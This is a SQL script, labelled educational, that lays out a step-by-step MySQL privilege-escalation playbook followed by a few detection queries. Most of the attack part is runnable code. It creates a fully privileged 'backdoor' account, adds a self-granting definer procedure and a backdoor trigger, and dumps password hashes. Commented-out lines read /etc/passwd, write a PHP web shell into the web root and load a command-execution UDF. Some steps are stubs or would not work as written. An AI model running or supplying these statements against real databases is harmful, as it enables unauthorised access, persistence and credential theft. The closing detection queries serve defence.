-- Database Privilege Escalation Techniques
-- Educational examples of escalating database privileges

-- ==========================================
-- STEP 1: RECONNAISSANCE
-- ==========================================

-- Check current user
SELECT USER();
SELECT CURRENT_USER();
SELECT SESSION_USER();

-- Check current database
SELECT DATABASE();

-- Check current privileges
SHOW GRANTS;
SHOW GRANTS FOR CURRENT_USER();

-- List all users
SELECT user, host FROM mysql.user;

-- Check user privileges in detail
SELECT * FROM information_schema.user_privileges;
SELECT * FROM information_schema.schema_privileges;
SELECT * FROM information_schema.table_privileges;
SELECT * FROM information_schema.column_privileges;

-- ==========================================
-- STEP 2: EXPLOITING FILE PRIVILEGES
-- ==========================================

-- Check if FILE privilege exists
SELECT * FROM information_schema.user_privileges WHERE privilege_type = 'FILE';

-- Read sensitive files (if FILE privilege exists)
-- SELECT LOAD_FILE('/etc/passwd');
-- SELECT LOAD_FILE('/var/www/html/config.php');

-- Write files (requires FILE privilege)
-- SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- ==========================================
-- STEP 3: EXPLOITING SUPER PRIVILEGE
-- ==========================================

-- Check for SUPER privilege
SELECT * FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';

-- Create new admin user (requires SUPER)
CREATE USER 'backdoor'@'localhost' IDENTIFIED BY 'secret123';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'localhost' WITH GRANT OPTION;
FLUSH PRIVILEGES;

-- Modify existing user privileges
-- GRANT ALL PRIVILEGES ON *.* TO 'lowpriv'@'localhost';

-- ==========================================
-- STEP 4: UDF (User Defined Function) EXPLOITATION
-- ==========================================

-- Check for plugin directory
SHOW VARIABLES LIKE 'plugin_dir';

-- Check existing functions
SELECT * FROM mysql.func;

-- Create malicious UDF (requires FILE and INSERT privileges on mysql.func)
-- This is the structure, actual exploitation requires compiled binary
-- CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_exploit.so';
-- SELECT sys_exec('whoami');

-- ==========================================
-- STEP 5: EXPLOITING STORED PROCEDURES
-- ==========================================

-- Check existing procedures
SELECT routine_name, routine_definition FROM information_schema.routines WHERE routine_schema = DATABASE();

-- Look for procedures running with DEFINER privileges
SELECT routine_name, definer, security_type FROM information_schema.routines WHERE security_type = 'DEFINER';

-- Create procedure with elevated privileges
DELIMITER //
CREATE PROCEDURE elevate_privileges()
SQL SECURITY DEFINER
BEGIN
    GRANT ALL PRIVILEGES ON *.* TO CURRENT_USER();
END //
DELIMITER ;

-- ==========================================
-- STEP 6: EXPLOITING TRIGGERS
-- ==========================================

-- Create malicious trigger (if INSERT/UPDATE privileges exist)
DELIMITER //
CREATE TRIGGER backdoor_trigger
AFTER INSERT ON users
FOR EACH ROW
BEGIN
    INSERT INTO audit_log (action, table_name, record_id) 
    VALUES ('BACKDOOR', 'users', NEW.id);
    -- Malicious code could be inserted here
END //
DELIMITER ;

-- ==========================================
-- STEP 7: PASSWORD HASH EXTRACTION
-- ==========================================

-- Extract password hashes
SELECT user, host, authentication_string FROM mysql.user;

-- If using old password format
SELECT user, password FROM mysql.user;

-- ==========================================
-- STEP 8: EXPLOITING WEAK CONFIGURATIONS
-- ==========================================

-- Check for users with empty passwords
SELECT user, host FROM mysql.user WHERE authentication_string = '';

-- Check for users with GRANT privileges
SELECT user, host FROM mysql.user WHERE Grant_priv = 'Y';

-- Check for users with SUPER privilege
SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';

-- Check for dangerous global variables
SHOW VARIABLES LIKE 'secure_file_priv';
SHOW VARIABLES LIKE 'local_infile';

-- ==========================================
-- STEP 9: EXPLOITING SQL MODES
-- ==========================================

-- Check current SQL mode
SELECT @@sql_mode;

-- Change SQL mode to allow dangerous operations (requires SUPER)
-- SET GLOBAL sql_mode = '';

-- ==========================================
-- STEP 10: EXPLOITING INFORMATION DISCLOSURE
-- ==========================================

-- Get database version and configuration
SELECT @@version_compile_os, @@version_compile_machine;
SHOW VARIABLES;

-- List all databases
SHOW DATABASES;

-- Get table structure
DESCRIBE users;
SHOW CREATE TABLE users;

-- ==========================================
-- DETECTION QUERIES
-- ==========================================

-- Find suspicious users
SELECT user, host, authentication_string FROM mysql.user WHERE user LIKE '%admin%' OR user LIKE '%root%';

-- Find recently created users
SELECT user, host FROM mysql.user;

-- Find users with excessive privileges
SELECT DISTINCT grantee FROM information_schema.user_privileges WHERE privilege_type IN ('SUPER', 'FILE', 'PROCESS');

-- Check for suspicious stored procedures
SELECT routine_name, definer, created FROM information_schema.routines WHERE routine_schema NOT IN ('mysql', 'information_schema', 'performance_schema', 'sys');

-- Check for triggers
SELECT trigger_name, event_object_table, action_statement FROM information_schema.triggers;
